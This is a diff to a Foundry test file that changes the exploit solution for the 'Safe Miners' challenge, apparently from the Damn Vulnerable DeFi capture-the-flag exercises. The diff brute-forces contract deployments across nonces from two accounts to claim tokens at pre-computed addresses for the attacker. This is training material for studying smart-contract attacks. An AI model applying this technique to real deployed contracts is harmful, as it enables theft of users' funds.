@@ -18,13 +18,16 @@ contract SafeMiners is Test {
     DamnValuableToken internal dvt;
     BrutalSafeMiners internal brutalsafeminers;
     address payable internal attacker;
+    address internal deployer;
 
     function setUp() public {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         utils = new Utilities();
-        address payable[] memory users = utils.createUsers(1);
-        attacker = users[0];
+        address payable[] memory users = utils.createUsers(2);
+        deployer = users[0];
+        attacker = users[1];
         vm.label(attacker, "Attacker");
+        vm.label(deployer, "Deployer");
 
         // Deploy Damn Valuable Token contract
         dvt = new DamnValuableToken();
@@ -42,12 +45,14 @@ contract SafeMiners is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-        vm.startPrank(attacker);
-        for (uint256 nonce = 0; nonce < 100; nonce++) {
-            brutalsafeminers = new BrutalSafeMiners(dvt, 100);
-            brutalsafeminers = new BrutalSafeMiners(dvt, 100);
+        //
+        for (uint256 nonce = 0; nonce < 1000; nonce++) {
+            vm.prank(deployer);
+            brutalsafeminers = new BrutalSafeMiners(attacker, dvt, 1000);
+            vm.prank(attacker);
+            brutalsafeminers = new BrutalSafeMiners(attacker, dvt, 1000);
         }
-        vm.stopPrank();
+
         /** EXPLOIT END **/
         validation();
     }
